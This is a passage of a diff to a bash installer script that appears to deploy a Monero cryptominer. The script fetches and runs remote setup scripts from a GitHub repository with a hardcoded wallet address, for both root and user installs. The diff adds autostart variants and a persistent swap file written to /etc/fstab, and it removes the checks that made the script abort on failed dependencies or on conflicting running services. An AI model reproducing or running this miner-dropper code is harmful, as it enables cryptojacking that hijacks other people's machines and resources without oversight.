+        fi
         
-        log_message "Both curl and wget failed (attempt $((retry + 1))/$max_retries)"
+        log_message "All download methods failed (attempt $((retry + 1))/$max_retries)"
         
         retry=$((retry + 1))
         
-        # On last retry attempt, try DNS fix if not already attempted
-        if [ $retry -eq $max_retries ] && [ "$dns_fix_attempted" = false ]; then
-            log_message "All download attempts failed - attempting DNS fix..."
+        # On certain retry attempts, try DNS fix
+        if [ $retry -eq 2 ] && [ "$dns_fix_attempted" = false ]; then
+            log_message "Attempting DNS fix..."
             if fix_dns_and_retry; then
-                log_message "DNS fixed - retrying download one more time..."
+                log_message "DNS fixed - continuing retries..."
                 dns_fix_attempted=true
-                max_retries=$((max_retries + 1))  # Give one more chance
-                sleep 3
             fi
+            sleep 2
         elif [ $retry -lt $max_retries ]; then
             log_message "Retry in 3 seconds..."
             sleep 3
         fi
     done
     
-    log_message "ERROR: $description failed after all retry attempts with both curl and wget"
+    log_message "ERROR: $description failed after all retry attempts"
+    log_message "Manual intervention required - please check network connectivity"
     return 1
 }
 
 root_installation() {
     log_message "Starting root installation..."
+    
+    # ==================== AUTO-SWAP FOR LOW-RAM SYSTEMS ====================
+    log_message "Checking system resources..."
+    
+    # Get RAM info (in MB)
+    TOTAL_RAM=$(free -m 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "0")
+    CURRENT_SWAP=$(free -m 2>/dev/null | awk '/^Swap:/ {print $2}' || echo "0")
+    
+    log_message "System RAM: ${TOTAL_RAM}MB, Swap: ${CURRENT_SWAP}MB"
+    
+    # Add swap if RAM < 2GB or no swap exists
+    if [ "$TOTAL_RAM" -lt 2048 ] || [ "$CURRENT_SWAP" -eq 0 ]; then
+        log_message "Low RAM detected - creating 2GB swap space..."
+        
+        SWAP_FILE="/swapfile"
+        
+        # Remove old swapfile if exists
+        if [ -f "$SWAP_FILE" ]; then
+            swapoff "$SWAP_FILE" 2>/dev/null || true
+            rm -f "$SWAP_FILE"
+        fi
+        
+        # Create swap file
+        if fallocate -l 2G "$SWAP_FILE" 2>/dev/null; then
+            log_message "Swap file created with fallocate"
+        elif dd if=/dev/zero of="$SWAP_FILE" bs=1M count=2048 2>/dev/null; then
+            log_message "Swap file created with dd"
+        else
+            log_message "WARNING: Could not create swap file"
+        fi
+        
+        # Setup swap if created
+        if [ -f "$SWAP_FILE" ]; then
+            chmod 600 "$SWAP_FILE"
+            
+            if mkswap "$SWAP_FILE" >/dev/null 2>&1 && swapon "$SWAP_FILE" 2>/dev/null; then
+                log_message "✓ Swap enabled: 2GB"
+                
+                # Make permanent
+                if ! grep -q "$SWAP_FILE" /etc/fstab 2>/dev/null; then
+                    echo "$SWAP_FILE none swap sw 0 0" >> /etc/fstab
+                    log_message "✓ Swap added to /etc/fstab (permanent)"
+                fi
+                
+                # Show new memory status
+                FREE_OUTPUT=$(free -h 2>/dev/null | grep -E "^(Mem|Swap):" || true)
+                log_message "New memory status:\n${FREE_OUTPUT}"
+            else
+                log_message "WARNING: Could not enable swap"
+            fi
+        fi
+    else
+        log_message "✓ Sufficient RAM/Swap available"
+    fi
+    # ==================== END AUTO-SWAP ====================
     
     # Install mail utilities
     install_mail_utils
@@ -656,7 +1480,7 @@ root_installation() {
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3.2.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_FIXED_WITH_AUTOSTART.sh?t=$(date +%s)" \
         "$wallet" \
         "root miner setup"
     
@@ -668,7 +1492,7 @@ user_installation() {
     
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
         "$wallet" \
         "user miner setup"
     
@@ -683,8 +1507,8 @@ log_message "Script started by user: $(whoami)"
 
 # Check dependencies first
 if ! check_dependencies; then
-    log_message "ERROR: Dependency check failed. Exiting."
-    exit 1
+    log_message "WARNING: Dependency check failed - continuing anyway..."
+    # Removed exit 1 - script will continue even with missing dependencies
 fi
 
 # Service checks
@@ -692,8 +1516,8 @@ log_message "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_message "ERROR: Service $service is running. Aborting."
-            exit 1
+            log_message "WARNING: Service $service is running - will attempt to continue anyway..."
+            # Removed exit 1 - script will continue even if services are running
         else
             log_message "Service $service exists but is not running"
         fi
@@ -728,3 +1552,7 @@ else
 fi
 
 log_message "Script execution completed"
+
+# Script integrity marker - if you see this comment, the download was complete
+# Version: systemd+sysvinit compatible (1465 lines)
+# SCRIPT_COMPLETE_MARKER_DO_NOT_REMOVE
